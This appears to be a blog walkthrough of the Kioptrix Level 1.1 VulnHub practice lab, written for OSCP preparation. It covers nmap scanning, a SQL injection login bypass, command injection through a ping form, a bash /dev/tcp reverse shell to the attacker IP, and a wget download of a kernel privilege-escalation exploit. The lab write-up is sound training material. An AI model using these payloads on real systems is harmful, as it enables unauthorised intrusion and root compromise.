---
description: 'OSCP Preparation: TJNULL List — Kioptrix Level 1.1 Walkthrough'
---

# Kioptrix Level 1.1 w/o Metasploit

For walkthrough on “Kioptrix Level 1” [Click here!](https://medium.com/@pramodsrinivasa/oscp-preparation-tjnull-list-kioptrix-level-1-walkthrough-b18300981253)

Continuing with the “[Kioptrix Level 1.1](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)” from the well-known [TJNULL list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview) (“The secret recipe for OSCP Preparation”).

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*R9Nm1JsulAYkeYIjoiCAfQ.png" alt="" height="459" width="700"><figcaption></figcaption></figure>

I downloaded the .rar file, and spun up the Virtual Machine in [Virtual Box](https://www.virtualbox.org/). For the attacker machine, i will be using [Kali Linux](https://www.kali.org/get-kali/#kali-platforms).

**Scanning and Enumeration Phase:**

Attacker IP: 192.168.1.7 (Kali Machine)

```
ifconfig eth0 | grep "inet"
```

<figure><img src="https://miro.medium.com/v2/resize:fit:619/1*VZR0JK-s-2MiWBQ2ojf1XQ.png" alt="" height="87" width="619"><figcaption></figcaption></figure>

Finding the Target IP Address (Kioptrix VM). The host grabs an address via DHCP as it boots. We can detect the IP Address either via [netdiscover](https://www.kali.org/tools/netdiscover/) reconnaissance tool or any network scanner tools like [Nmap](https://nmap.org/) to identify live hosts.

Netdiscover Command:

```
sudo netdiscover -i eth0 -r 192.168.1.0/24
                  or
nmap -T4 -sn 192.168.1.0/24
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*HLpRhO6f7pvZbeOhEBULRg.png" alt="" height="224" width="700"><figcaption></figcaption></figure>

Mac Vendor: “_PCS Systemtechnik GmbH” belongs to VirtualBox. Here 192.168.1.102 belongs to our machine “Kioptrix Level 1.1”._

**Service Enumeration:** Detailed scanning of the target with Nmap.

```
sudo nmap -sV -sC -Pn -sS -A 192.168.1.102
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*QLvLvBeRGqahBwIdNYmJ_A.png" alt="" height="543" width="700"><figcaption></figcaption></figure>

Interesting services worth exploring based on above scan results.

```
| Port          | State | Service  | Version                        |
| ------------- | ----- | -------- | ------------------------------ |
| 22/tcp        | open  | ssh      | OpenSSH 3.9p1 (protocol 1.99)  |
| 80/tcp        | open  | http     | Apache httpd 2.0.52 ((CentOS)) |
| 111/tcp       | open  | rpcbind  | 2 (RPC #100000)                |
| 443/tcp       | open  | ssl/http | Apache httpd 2.0.52 ((CentOS)) |
| 631/tcp       | open  | ipp      | CUPS 1.1                       |
| 3306/tcp      | open  | mysql    | MySQL (unauthorized)           |
```

The machine is running with outdated versions of both OpenSSH and Apache, with MySQL installed accessible over the network. There are several RPC ports and a printing service that are exposed to the network.

**Exploitation 1:** Lets explore the application hosted. There is a Login page and our earlier Nmap Scan revealed MySQL Server running on the backend, we can go ahead and try a simple SQL Injection.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*yJWp0vBjLpBkEnozeDGCNA.png" alt="" height="237" width="700"><figcaption></figcaption></figure>

Had multiple issues with the Original downloaded image of [Kioptrix 1.1](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/) where the application hosted in VM did not work accurately. Had to re-configure the Virtual Machine with the Updated Image.

To understand more on SQL Injections in Login Pages -> [Click here!](https://securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html)

Assuming that the backend SQL query for the login page would resemble the below

```
SELECT * FROM users WHERE username='' AND password=''
```

Let’s try injecting the following code in both the Username and Password fields.

```
1' or '1'='1
```

If the assumption is correct, below SQL query would be generated in the backend.

```
SELECT * FROM users WHERE username='1' or '1'='1' AND password='1' or '1'='1'
```

which means that is Username = True and Password = True, we should be able to login as the first tuple(user) from the users table — usually the admin account.

The SQL Injection worked and we are able to access the next page, which is Ping Command prompt!

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*0LvjiTADSU3bUVr7mC-76g.png" alt="" height="308" width="700"><figcaption></figcaption></figure>

Ping command works and that the php code is executing system commands. At this point, we can try to see if the php script is vulnerable to [Command Injection](https://www.owasp.org/index.php/Command_Injection).

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*uPY7oqDPsmcFhhqOeB_oCw.png" alt="" height="339" width="602"><figcaption></figcaption></figure>

**Exploitation:** Let’s go ahead and type in: Basically telling the system to run **ping** against our attacker machine (192.168.1.7), then run the **ls-l** command. Technically the “**;**” symbol is a command separator.

```
192.168.1.7;ls -l
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*e36MqTmdy3e4bEcbZYarAw.png" alt="" height="294" width="700"><figcaption></figcaption></figure>

The script is vulnerable to command injection! Let’s go ahead and attempt to invoke a [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Setting up a Netcat listener on port 443 on the attacker machine.

```
nc -nlvp 443
```

Now, let’s go back to the website and run the following command:

```
127.0.0.1; bash -i >& /dev/tcp/192.168.1.7/443 0>&1
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*kKHMmxdOBpJN7VD_u7r6lQ.png" alt="" height="297" width="700"><figcaption></figcaption></figure>

This will basically initiate a reverse TCP connection using bash to the attacker machine (192.168.1.7), on port 443.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Ce2BcjqT-PRkiwHWf1XW6Q.png" alt="" height="587" width="700"><figcaption></figcaption></figure>

We were able to connect to the Kioptrix 1.1 machine and are currently running as the **apache** account. Our next step from here is to carry out [Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) to get access to the root account.

**Privilege Escalation:** Checking the Kernel version number.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*0wjA1xBDeTbSdYaD1l3yeg.png" alt="" height="370" width="700"><figcaption></figcaption></figure>

A quick google search for any exploits related to the linux kernel version revealed Privilege Escalation exploit. [Click here](https://www.exploit-db.com/exploits/9542) for details.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*pIjxI-ue9AIYaEyTatwUNA.png" alt="" height="362" width="700"><figcaption></figcaption></figure>

Checking searchsploit if we have a local copy of the exploit available for quick usage.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*_8--DRy7v2dDvFpDqoY_Ww.png" alt="" height="87" width="700"><figcaption></figcaption></figure>

Copying the exploit to the current directory (Desktop). Hosting a simple Http server and downloading the exploit to the target machine.

```
cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c .
python -m http.server
(Target machine)wget -O /tmp/9542.c http://192.168.1.7:8000/9542.c
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*O5k_qr-NUkMy4597gjUpCw.png" alt="" height="99" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:600/1*O9vOKTQ-4lHofQVg3h9M4Q.png" alt="" height="108" width="600"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*9bCu6md3m_b4a-DDxxnSeQ.png" alt="" height="468" width="700"><figcaption></figcaption></figure>

Compiling the exploit and executing it:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*4gc_Ia7R8skbbcikbRLdYQ.png" alt="" height="182" width="700"><figcaption></figcaption></figure>

We finally have escalated as root user ! Mission accomplished.
